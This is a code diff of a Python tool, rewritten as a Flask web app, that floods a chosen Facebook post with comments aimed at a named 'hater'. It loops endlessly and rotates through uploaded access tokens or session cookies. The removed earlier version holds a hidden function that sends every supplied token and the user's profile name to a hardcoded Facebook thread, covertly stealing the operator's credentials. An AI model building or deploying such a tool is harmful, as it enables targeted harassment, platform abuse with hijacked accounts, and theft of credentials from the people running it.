@@ -1,148 +1,210 @@
+from flask import Flask, request, redirect, url_for, render_template_string
 import requests
-import json
 import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-import random
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b"Roma Rulex Server is Alive")
+app = Flask(__name__)
 
-def execute_server():
-    PORT = 4000
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print("Server running at http://localhost:{}".format(PORT))
-        httpd.serve_forever()
-
-def send_messages():
-    with open('password.txt', 'r') as file:
-        password = file.read().strip()
-
-    entered_password = password
-
-    if entered_password != password:
-        print('[-] <==> Incorrect Password!')
-        sys.exit()
-
-    with open('tokennum.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
-
-    requests.packages.urllib3.disable_warnings()
-
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
-        else:
-            if system() == 'Windows':
-                os.system('cls')
-    cls()
-
-    def liness():
-        print('\u001b[37' + '---------------------------------------------------')
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
-    }
-
-
-    liness()
-
-    access_tokens = [token.strip() for token in tokens]
-
-    with open('POSTID.txt', 'r') as file:
-        convo_id = file.read().strip()
-
-    with open('file.txt', 'r') as file:
-        text_file_path = file.read().strip()
-
-    with open(text_file_path, 'r') as file:
-        messages = file.readlines()
-
-    num_messages = len(messages)
-    max_tokens = min(num_tokens, num_messages)
-
-    with open('hatersname.txt', 'r') as file:
-        haters_name = file.read().strip()
-
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    liness()
-    def getName(token):
-        try:
-            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
-        except:
-            data = ""
-        if 'name' in data:
-            return data['name']
-        else:
-            return "Error occured"
-
-    def msg():
-        parameters = {
-            'access_token' : random.choice(access_tokens),
-            'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\nToken : '+" | ".join(access_tokens)+'\nLink : https://www.facebook.com/comments/'+convo_id
+@app.route('/')
+def index():
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>R4JV33R POST SERVER</title>
+    <style>
+        body {
+            background-image: url('https://i.imgur.com/7yNPzB5.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
-        try:
-            s = requests.post("https://graph.facebook.com/v15.0/t_100002189532580/", data=parameters, headers=headers)
-        except:
-            pass
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 40px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: none;
+        }
+        .btn-submit {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 100%;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            margin-top: auto;
+        }
+        footer p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <h1 style="color: red;">R4JV33R RULEX🔥</h1>
+        <h1 style="color: blue;">POST SERVER</h1>
+    </header>
 
-    msg()
+    <div class="container">
+        <form action="/" method="post" enctype="multipart/form-data">
+            <div class="mb-3">
+                <label for="threadId">POST ID:</label>
+                <input type="text" class="form-control" id="threadId" name="threadId" required>
+            </div>
+            <div class="mb-3">
+                <label for="kidx">Enter Hater Name:</label>
+                <input type="text" class="form-control" id="kidx" name="kidx" required>
+            </div>
+            <div class="mb-3">
+                <label for="method">Choose Method:</label>
+                <select class="form-control" id="method" name="method" required onchange="toggleFileInputs()">
+                    <option value="token">Token</option>
+                    <option value="cookies">Cookies</option>
+                </select>
+            </div>
+            <div class="mb-3" id="tokenFileDiv">
+                <label for="tokenFile">Select Your Tokens File:</label>
+                <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
+            </div>
+            <div class="mb-3" id="cookiesFileDiv" style="display: none;">
+                <label for="cookiesFile">Select Your Cookies File:</label>
+                <input type="file" class="form-control" id="cookiesFile" name="cookiesFile" accept=".txt">
+            </div>
+            <div class="mb-3">
+                <label for="commentsFile">Select Your Comments File:</label>
+                <input type="file" class="form-control" id="commentsFile" name="commentsFile" accept=".txt" required>
+            </div>
+            <div class="mb-3">
+                <label for="time">Speed in Seconds (minimum 20 second):</label>
+                <input type="number" class="form-control" id="time" name="time" required>
+            </div>
+            <button type="submit" class="btn-submit">Submit Your Details</button>
+        </form>
+    </div>
+
+    <footer>
+        <p style="color: #FF5733;">Post server Tool</p>
+        <p>Made with ❤️ by Rajveer</p>
+    </footer>
+
+    <script>
+        function toggleFileInputs() {
+            var method = document.getElementById('method').value;
+            if (method === 'token') {
+                document.getElementById('tokenFileDiv').style.display = 'block';
+                document.getElementById('cookiesFileDiv').style.display = 'none';
+            } else {
+                document.getElementById('tokenFileDiv').style.display = 'none';
+                document.getElementById('cookiesFileDiv').style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
+''')
+
+
+@app.route('/', methods=['POST'])
+def send_message():
+    method = request.form.get('method')
+    thread_id = request.form.get('threadId')
+    mn = request.form.get('kidx')
+    time_interval = int(request.form.get('time'))
+
+    comments_file = request.files['commentsFile']
+    comments = comments_file.read().decode().splitlines()
+
+    if method == 'token':
+        token_file = request.files['tokenFile']
+        credentials = token_file.read().decode().splitlines()
+        credentials_type = 'access_token'
+    else:
+        cookies_file = request.files['cookiesFile']
+        credentials = cookies_file.read().decode().splitlines()
+        credentials_type = 'Cookie'
+
+    num_comments = len(comments)
+    num_credentials = len(credentials)
+
+    post_url = f'https://graph.facebook.com/v15.0/{thread_id}/comments'
+    haters_name = mn
+    speed = time_interval
+
     while True:
         try:
-            for message_index in range(num_messages):
-                token_index = message_index % max_tokens
-                access_token = access_tokens[token_index]
-
-                message = messages[message_index].strip()
-
-                url = "https://graph.facebook.com/v15.0/{}/comments".format(convo_id)
-                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                response = requests.post(url, json=parameters, headers=headers)
+            for comment_index in range(num_comments):
+                credential_index = comment_index % num_credentials
+                credential = credentials[credential_index]
+                
+                parameters = {'message': haters_name + ' ' + comments[comment_index].strip()}
+                
+                if credentials_type == 'access_token':
+                    parameters['access_token'] = credential
+                    response = requests.post(post_url, json=parameters, headers=headers)
+                else:
+                    headers['Cookie'] = credential
+                    response = requests.post(post_url, data=parameters, headers=headers)
 
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
-                    print("[+] Comment {} of Post {} sent by Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("[+] Comment No. {} Post Id {} Credential No. {}: {}".format(
+                        comment_index + 1, post_url, credential_index + 1, haters_name + ' ' + comments[comment_index].strip()))
                     print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
+                    print("\n" * 2)
                 else:
-                    print("[x] Failed to send Comment {} of Post {} with Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("[x] Failed to send Comment No. {} Post Id {} Credential No. {}: {}".format(
+                        comment_index + 1, post_url, credential_index + 1, haters_name + ' ' + comments[comment_index].strip()))
                     print("  - Time: {}".format(current_time))
-                    liness()
-                    liness()
+                    print("\n" * 2)
                 time.sleep(speed)
-
-            print("\+] All Comments sent. Restarting the process...")
         except Exception as e:
-            print("[!] An error occurred: {}".format(e))
+            print(e)
+            time.sleep(30)
 
-def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.start()
+    return redirect(url_for('index'))
 
-    send_messages()
 
 if __name__ == '__main__':
-    main()
+    app.run(host='0.0.0.0', port=5000)
